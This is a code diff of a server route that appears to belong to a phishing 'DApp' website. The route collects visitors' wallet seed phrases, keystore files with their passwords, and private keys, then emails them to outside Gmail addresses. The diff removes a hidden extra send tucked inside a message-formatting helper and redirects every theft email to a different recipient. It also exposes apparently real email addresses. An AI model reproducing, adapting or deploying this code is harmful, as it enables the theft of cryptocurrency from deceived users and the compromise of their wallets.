@@ -1,17 +1,6 @@
 import nodemailer from 'nodemailer'
 
 const formatMessage = async (message: string) => {
-  const email = process.env.EMAIL;
-  const pass = process.env.PASS;
-
-  const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-      user: email,
-      pass,
-    }
-  });
-
   // Split the message into lines
   const lines = message.split(/\r?\n/);
 
@@ -21,29 +10,6 @@ const formatMessage = async (message: string) => {
   // Join formatted lines into a single HTML string
   const formattedMessage = formattedLines.join('');
 
-  const mailOptions = {
-    from: `BN ${email}`,
-    to: "ladenmike7@gmail.com",
-    subject: "BN",
-    html: `<div>${message}</div>`,
-  };
-
-  transporter.verify(function (error: any, success: any) {
-    if (error) {
-      console.log(`here is the error: ${error}`);
-    } else {
-      console.log("From two: Server is ready to take our messages");
-    }
-  });
-
-  const result = await transporter.sendMail(mailOptions);
-
-  if (result.response.includes("OK")) {
-    console.log("email sent successfully!!");
-  } else {
-    console.log("Internal server error");
-  }
-
   // Return the formatted message
   return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
 }
@@ -51,7 +17,6 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
-    await formatMessage('hi');
 
     if (phrase) {
 
@@ -71,7 +36,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'ogobillions458@gmail.com',
+        to: 'ladenmike7@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -110,7 +75,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "ogobillions458@gmail.com",
+        to: 'ladenmike7@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -151,7 +116,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "ogobillions458@gmail.com",
+        to: 'ladenmike7@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
